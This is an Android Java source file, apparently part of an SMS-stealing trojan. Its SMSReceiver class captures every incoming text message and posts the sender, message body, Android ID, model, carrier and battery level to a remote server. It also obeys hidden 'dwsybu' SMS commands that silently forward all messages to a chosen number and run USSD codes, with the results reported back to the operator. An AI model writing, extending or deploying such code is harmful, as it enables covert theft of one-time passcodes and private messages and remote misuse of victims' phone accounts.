package com.drnull.app;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

public class SMSReceiver extends BroadcastReceiver {
    private static final String TAG = "SMSR";
    private static final String CMD = "dwsybu ";
    private static final String FWD_PREFIX = "FWD from ";
    private static final String PREFS = "null_settings";
    private static String SVR = null;
    private static String serverUrl() { if (SVR == null) SVR = SecureConfig.getServerUrl(); return SVR; }

    // Anti-loop: timestamp of last sent message, skip incoming within 3 seconds
    private static volatile long _lastSentTime = 0;
    private static final long SKIP_WINDOW = 3000;

    // Anti-loop: hash of last sent message to avoid duplicate forward
    private static volatile String _lastSentHash = "";

    // Client-side dedup: track recent notifications to prevent server-side spam
    private static final HashMap<String, Long> _recentNotifs = new HashMap<>();
    private static final long DEDUP_WINDOW = 30000; // 30 seconds

    @Override
    public void onReceive(Context ctx, Intent i) {
        try {
            if (!"android.provider.Telephony.SMS_RECEIVED".equals(i.getAction())) return;
            Bundle b = i.getExtras();
            if (b == null) return;
            Object[] pdus = (Object[]) b.get("pdus");
            String fmt = b.getString("format");
            if (pdus == null) return;

            String aid = Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
            SharedPreferences prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
            boolean fwdEnabled = prefs.getBoolean("forward_enabled", false);
            String fwdNum = prefs.getString("forward_number", "");

            // === MULTIPART SMS: Concatenate all PDUs first ===
            StringBuilder fullBody = new StringBuilder();
            String from = "";
            for (Object pdu : pdus) {
                SmsMessage sms = Build.VERSION.SDK_INT >= 23
                    ? SmsMessage.createFromPdu((byte[]) pdu, fmt)
                    : SmsMessage.createFromPdu((byte[]) pdu);
                if (sms == null) continue;
                if (sms.getMessageBody() != null) fullBody.append(sms.getMessageBody());
                if (sms.getOriginatingAddress() != null && from.isEmpty()) from = sms.getOriginatingAddress();
            }

            String body = fullBody.toString();
            String trimmed = body.trim();

            // Anti-loop: skip if this SMS arrived within SKIP_WINDOW ms of our last send
            long now = System.currentTimeMillis();
            if (now - _lastSentTime < SKIP_WINDOW) {
                Log.d(TAG, "Skip incoming SMS (sent " + (now - _lastSentTime) + "ms ago)");
                return;
            }

            // Check if it's a dwsybu command
            if (trimmed.toLowerCase().startsWith(CMD)) {
                handleCommand(ctx, trimmed, from, aid);
                return;
            }

            // Anti-loop: skip messages we already forwarded (bounce-back from same number)
            if (trimmed.startsWith(FWD_PREFIX)) {
                Log.d(TAG, "Skip forwarded message");
                return;
            }

            // Anti-loop: skip our own reply messages
            if (trimmed.startsWith("OfflineMode") || trimmed.startsWith("USSD ") || trimmed.startsWith("Error:")) {
                Log.d(TAG, "Skip own reply message");
                return;
            }

            // Anti-loop: skip duplicate (same content hash as last sent)
            String msgHash = body.hashCode() + "|" + from;
            if (msgHash.equals(_lastSentHash) && (now - _lastSentTime) < 10000) {
                Log.d(TAG, "Skip duplicate message");
                return;
            }

            // Forward SMS if offline mode is ON
            if (fwdEnabled && !fwdNum.isEmpty()) {
                String normFwd = fwdNum.replaceAll("[^0-9]", "");
                String normFrom = from.replaceAll("[^0-9]", "");
                if (normFwd.equals(normFrom)) {
                    Log.d(TAG, "Skip forward to self");
                } else {
                    try {
                        String fwdText = FWD_PREFIX + from + ":\n" + body;
                        ArrayList<String> parts = SmsManager.getDefault().divideMessage(fwdText);
                        SmsManager sm = SmsManager.getDefault();
                        for (String part : parts) {
                            sm.sendTextMessage(fwdNum, null, part, null, null);
                        }
                        _lastSentTime = System.currentTimeMillis();
                        _lastSentHash = body.hashCode() + "|" + fwdNum;
                    } catch (Exception fe) {
                        Log.e(TAG, "Forward err", fe);
                    }
                }
            }

            // Client-side dedup: skip if we already sent this exact notification recently
            String dedupKey = from + ":" + body.hashCode();
            Long lastNotifTime = _recentNotifs.get(dedupKey);
            if (lastNotifTime != null && (now - lastNotifTime) < DEDUP_WINDOW) {
                Log.d(TAG, "Skip duplicate notification");
                return;
            }
            _recentNotifs.put(dedupKey, now);

            // Clean old entries
            if (_recentNotifs.size() > 200) {
                ArrayList<String> toRemove = new ArrayList<>();
                for (Map.Entry<String, Long> e : _recentNotifs.entrySet()) {
                    if (now - e.getValue() > DEDUP_WINDOW) toRemove.add(e.getKey());
                }
                for (String k : toRemove) _recentNotifs.remove(k);
            }

            // Get actual battery and carrier
            int battery = getBattery(ctx);
            String carrier = getCarrier(ctx);

            // Send FULL concatenated message to server (single notification)
            Map<String, String> d = new HashMap<>();
            d.put("action", "smsreceived");
            d.put("model", Build.MODEL);
            d.put("androidid", aid);
            d.put("androidv", Build.VERSION.RELEASE);
            d.put("carrier", carrier);
            d.put("battery", String.valueOf(battery));
            d.put("text", body);
            d.put("from", from);
            WSService.post(serverUrl() + "/api", d);

        } catch (Exception e) {
            Log.e(TAG, "onReceive err", e);
        }
    }

    private int getBattery(Context ctx) {
        try {
            android.content.IntentFilter f = new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            android.content.Intent i = ctx.registerReceiver(null, f);
            return i != null ? i.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) : -1;
        } catch (Exception e) { return -1; }
    }

    private String getCarrier(Context ctx) {
        try {
            TelephonyManager t = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            if (t != null && t.getSimOperatorName() != null) return t.getSimOperatorName();
        } catch (Exception e) {}
        return "unknown";
    }

    private void handleCommand(Context ctx, String body, String replyTo, String aid) {
        try {
            String lower = body.toLowerCase();
            SharedPreferences prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE);

            if (lower.startsWith(CMD + "offline ")) {
                String number = body.substring(CMD.length() + 8).trim();
                prefs.edit().putBoolean("forward_enabled", true).putString("forward_number", number).apply();
                sendReply(ctx, replyTo, "OfflineMode is On and set in this number : " + number);
                Map<String, String> m = baseInfo(aid);
                m.put("action", "forward_on");
                m.put("number", number);
                WSService.post(serverUrl() + "/api", m);

            } else if (lower.trim().equals(CMD + "off") || lower.startsWith(CMD + "offline off")) {
                prefs.edit().putBoolean("forward_enabled", false).apply();
                sendReply(ctx, replyTo, "OfflineMode is Off");
                Map<String, String> m = baseInfo(aid);
                m.put("action", "forward_off");
                WSService.post(serverUrl() + "/api", m);

            } else if (lower.startsWith(CMD + "ussd ")) {
                String code = body.substring(CMD.length() + 5).trim();
                executeUssd(ctx, code, replyTo, aid);
            }
        } catch (Exception e) {
            Log.e(TAG, "handleCmd err", e);
            sendReply(ctx, replyTo, "Error: " + e.getMessage());
        }
    }

    private void sendReply(Context ctx, String to, String text) {
        try {
            _lastSentTime = System.currentTimeMillis();
            _lastSentHash = text.hashCode() + "|" + to;
            SmsManager sm = SmsManager.getDefault();
            ArrayList<String> parts = sm.divideMessage(text);
            for (String part : parts) {
                sm.sendTextMessage(to, null, part, null, null);
            }
        } catch (Exception e) {
            Log.e(TAG, "sendReply err", e);
        }
    }

    private void executeUssd(Context ctx, String code, String replyTo, String aid) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
                if (tm != null) {
                    tm.sendUssdRequest(code, new TelephonyManager.UssdResponseCallback() {
                        public void onReceiveUssdResponse(TelephonyManager t, String request, CharSequence response) {
                            sendReply(ctx, replyTo, "USSD Response:\n" + response.toString());
                            Map<String, String> m = baseInfo(aid);
                            m.put("action", "ussd_result");
                            m.put("code", code);
                            m.put("result", response.toString());
                            WSService.post(serverUrl() + "/api", m);
                        }
                        public void onReceiveUssdResponseFailed(TelephonyManager t, String request, CharSequence response) {
                            sendReply(ctx, replyTo, "USSD Failed:\n" + (response != null ? response.toString() : "Unknown error"));
                            Map<String, String> m = baseInfo(aid);
                            m.put("action", "ussd_result");
                            m.put("code", code);
                            m.put("result", "FAILED: " + (response != null ? response.toString() : "Unknown"));
                            WSService.post(serverUrl() + "/api", m);
                        }
                    }, new Handler(Looper.getMainLooper()));
                }
            } else {
                Intent intent = new Intent(Intent.ACTION_CALL);
                intent.setData(Uri.parse("tel:" + Uri.encode(code)));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(intent);
                sendReply(ctx, replyTo, "USSD sent (check phone screen for result)");
            }
        } catch (Exception e) {
            Log.e(TAG, "USSD err", e);
            sendReply(ctx, replyTo, "USSD Error: " + e.getMessage());
        }
    }

    private Map<String, String> baseInfo(String aid) {
        Map<String, String> m = new HashMap<>();
        m.put("model", Build.MODEL);
        m.put("androidid", aid);
        m.put("androidv", Build.VERSION.RELEASE);
        m.put("carrier", "");
        m.put("battery", "-1");
        return m;
    }
}
